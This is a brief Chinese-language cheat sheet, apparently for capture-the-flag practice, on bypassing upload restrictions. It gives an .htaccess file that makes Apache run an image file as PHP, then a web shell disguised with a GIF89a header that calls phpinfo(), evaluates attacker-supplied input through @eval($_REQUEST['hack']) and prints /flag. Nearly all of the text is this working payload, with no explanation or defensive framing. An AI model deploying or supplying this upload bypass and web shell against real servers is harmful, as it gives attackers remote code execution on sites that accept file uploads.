# 


使用.htaccess来绕过限制

上传: .htaccess

```txt
<FilesMatch "1.png"> 
SetHandler application/x-httpd-php 
</FilesMatch> 
```

```txt
SetHandler application/x-httpd-php
```

然后传php: 

```php
GIF89a
<script language='php'> 
phpinfo();
@eval($_REQUEST['hack']);
show_source("/flag");
</script>
```
